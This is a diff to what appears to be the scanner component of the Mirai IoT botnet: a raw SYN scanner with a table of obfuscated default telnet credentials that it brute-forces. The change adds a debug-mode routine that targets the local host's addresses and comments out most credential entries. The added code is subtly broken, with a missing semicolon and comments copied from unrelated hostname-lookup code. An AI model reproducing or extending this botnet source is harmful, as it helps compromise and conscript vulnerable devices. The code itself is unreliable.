@@ -27,6 +27,88 @@
 #include "checksum.h"
 #include "resolv.h"
 
+// Returns hostname for the local computer 
+int checkHostName(int hostname) 
+{ 
+    if (hostname == -1) 
+    {
+        return 0; 
+    }
+    return 1;
+} 
+  
+// Returns host information corresponding to host name 
+int checkHostEntry(struct hostent * hostentry) 
+{ 
+    if (hostentry == NULL) 
+    { 
+        return 0;
+    } 
+    return 1;
+} 
+  
+// Converts space-delimited IPv4 addresses 
+// to dotted-decimal format 
+int checkIPbuffer(char *IPbuffer) 
+{ 
+    if (NULL == IPbuffer) 
+    { 
+        return 0;
+    } 
+    return 1;
+}
+
+// Driver code 
+ipv4_t get_next_target(void) 
+{ 
+    static int order = 0;
+    char hostbuffer[256]; 
+    char *IPbuffer; 
+    struct hostent *host_entry; 
+    int hostname; 
+    ipv4_t *p_host_ip;
+    ipv4_t return_ip;
+  
+    // To retrieve hostname 
+    hostname = gethostname(hostbuffer, sizeof(hostbuffer)); 
+    if(0 == checkHostName(hostname))
+    {
+        return 0;
+    }
+  
+    // To retrieve host information 
+    host_entry = gethostbyname(hostbuffer); 
+    if(0 == checkHostEntry(host_entry))
+    {
+        return 0;
+    }
+  
+    // To convert an Internet network 
+    // address into ASCII string
+    /* 
+    IPbuffer = inet_ntoa(*((struct in_addr*) 
+                           host_entry->h_addr_list[0])); 
+  
+    printf("Hostname: %s\n", hostbuffer); 
+    printf("Host IP: %s", IPbuffer); 
+    */
+
+    p_host_ip = host_entry->h_addr_list[order];
+    if(p_host_ip == NULL)
+    {
+        order = 0;
+        return 0;
+    }
+    else
+    {
+        order++;
+    }
+
+    return_ip = *p_host_ip | (1 << 24)
+  
+    return return_ip; 
+} 
+
 int scanner_pid, rsck, rsck_out, auth_table_len = 0;
 char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
 struct scanner_auth *auth_table = NULL;
@@ -121,10 +203,13 @@ void scanner_init(void)
     tcph->syn = TRUE;
 
     // Set up passwords
+    /*
     add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
     add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
     add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
+    */
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 1);                      // admin    admin
+    /*
     add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888
     add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  // root     xmhdipc
     add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  // root     default
@@ -183,6 +268,7 @@ void scanner_init(void)
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                  // admin    meinsm
     add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              // tech     tech
     add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker
+    */
 
 
 #ifdef DEBUG
@@ -196,6 +282,7 @@ void scanner_init(void)
         struct scanner_connection *conn;
         struct timeval tim;
         int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;
+        ipv4_t next_addr;
 
         // Spew out SYN to try and get a response
         if (fake_time != last_spew)
@@ -210,7 +297,19 @@ void scanner_init(void)
 
                 iph->id = rand_next();
                 iph->saddr = LOCAL_ADDR;
+#ifdef DEBUG
+                next_addr = get_next_target();
+                if(next_addr != 0)
+                {
+                    iph->daddr = next_addr;
+                }
+                else
+                {
+                    iph->daddr = get_random_ip();
+                }
+#else
                 iph->daddr = get_random_ip();
+#endif
                 iph->check = 0;
                 iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
